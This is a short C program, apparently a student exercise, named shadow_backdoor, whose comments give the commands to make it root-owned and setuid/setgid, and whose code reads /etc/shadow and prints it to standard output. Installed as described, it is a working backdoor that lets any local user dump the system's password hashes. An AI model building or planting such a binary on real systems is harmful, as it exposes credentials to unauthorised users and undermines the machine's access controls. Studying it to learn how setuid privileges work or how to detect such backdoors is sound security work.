// Andraz Mesaric-Sirec 63180202

// sudo chown root:root shadow_backdoor
// sudo chmod 7455 shadow_backdoor

#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>

extern int errno;

int main(int argc, char *argv[]) {
    int file = open("/etc/shadow", O_RDONLY);

    if (file < 0) {
        perror("Failed to open file");
        exit(errno);
    }

    char* buffer = (char *) calloc(1, sizeof(char));
    while (read(file, buffer, 1)) write(1, buffer, 1);

    if (close(file) < 0) {
        perror("Failed to close file");
        exit(errno);
    }
    
    return 0;
}